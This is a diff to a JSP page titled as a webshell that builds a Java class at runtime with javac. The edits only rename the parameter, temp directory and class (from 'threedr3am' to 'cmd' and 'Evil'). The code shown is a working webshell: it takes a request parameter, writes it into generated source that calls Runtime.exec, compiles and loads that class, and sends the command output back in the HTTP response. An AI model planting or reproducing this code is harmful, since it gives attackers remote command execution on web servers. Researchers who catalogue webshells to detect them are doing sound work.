@@ -15,8 +15,8 @@
 <body>
 <h2>javac动态编译class的JSP Webshell</h2>
 <%
-    String c = request.getParameter("threedr3am");
-    String tmpPath = Files.createTempDirectory("threedr3am").toFile().getPath();
+    String c = request.getParameter("cmd");
+    String tmpPath = Files.createTempDirectory("xxxxx").toFile().getPath();
     JavaCompiler javaCompiler = ToolProvider.getSystemJavaCompiler();
     DiagnosticCollector<JavaFileObject> diagnostics = new DiagnosticCollector();
     StandardJavaFileManager standardJavaFileManager = javaCompiler
@@ -27,9 +27,9 @@
             .append("import java.io.IOException;\n")
             .append("import java.io.InputStream;\n")
             .append("import java.io.InputStreamReader;\n")
-            .append("public class Threedr3am" + id + " {\n")
+            .append("public class Evil" + id + " {\n")
             .append("   public static String result = \"\";\n")
-            .append("   public Threedr3am" + id + "() throws Throwable  {\n")
+            .append("   public Evil" + id + "() throws Throwable  {\n")
             .append("        StringBuilder stringBuilder = new StringBuilder();\n")
             .append("        try {")
             .append("               BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\"" + c + "\").getInputStream()));\n")
@@ -44,11 +44,11 @@
             .append("        throw new Throwable(stringBuilder.toString());")
             .append("   }\n")
             .append("}");
-    Files.write(Paths.get(tmpPath + File.separator + "Threedr3am" +id + ".java"), stringBuilder.toString().getBytes());
-    Iterable fileObject = standardJavaFileManager.getJavaFileObjects(tmpPath + File.separator + "Threedr3am" +id + ".java");
+    Files.write(Paths.get(tmpPath + File.separator + "Evil" +id + ".java"), stringBuilder.toString().getBytes());
+    Iterable fileObject = standardJavaFileManager.getJavaFileObjects(tmpPath + File.separator + "Evil" +id + ".java");
     javaCompiler.getTask(null, standardJavaFileManager, diagnostics, null, null, fileObject).call();
     try {
-        new URLClassLoader(new URL[]{new URL("file:" + tmpPath + File.separator)}).loadClass("Threedr3am" + id).newInstance();
+        new URLClassLoader(new URL[]{new URL("file:" + tmpPath + File.separator)}).loadClass("Evil" + id).newInstance();
     } catch (Throwable e) {
         response.getOutputStream().write(e.getMessage().getBytes());
     }
